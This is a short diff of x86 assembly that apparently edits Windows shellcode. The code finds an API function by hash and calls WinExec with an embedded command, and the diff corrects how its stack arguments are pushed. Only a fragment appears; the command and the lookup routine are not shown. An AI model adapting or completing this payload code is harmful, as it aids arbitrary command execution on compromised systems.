@@ -16,7 +16,6 @@ entry:
   push 0x61DA2999               ; set hash key
   push 0x0AE20914               ; set function hash
   call find_api                 ; try to find api address
-  add esp, 2*4                  ; restore stack for arguments
   cmp eax, 0                    ; check target function is found
   jz not_found                  ;
 
@@ -27,13 +26,12 @@ entry:
   sub esp, edi                  ; adjust current stack
 
   ; call WinExec
+  lea edx, [ebx+command]        ; lpCmdLine
   xor ecx, ecx                  ; clear ecx
   mov cl, [ebx+cmd_show]        ; set uCmdShow
-  push ecx                      ; store uCmdShow
-  lea ecx, [ebx+command]        ; calculate lpCmdLine
-  push ecx                      ; store lpCmdLine
+  push ecx                      ; push uCmdShow
+  push edx                      ; push lpCmdLine
   call eax                      ; call api function
-  ; add esp, 2*4                ; restore stack for arguments
 
   ; restore aligned stack
   add esp, edi                  ; restore stack from edi
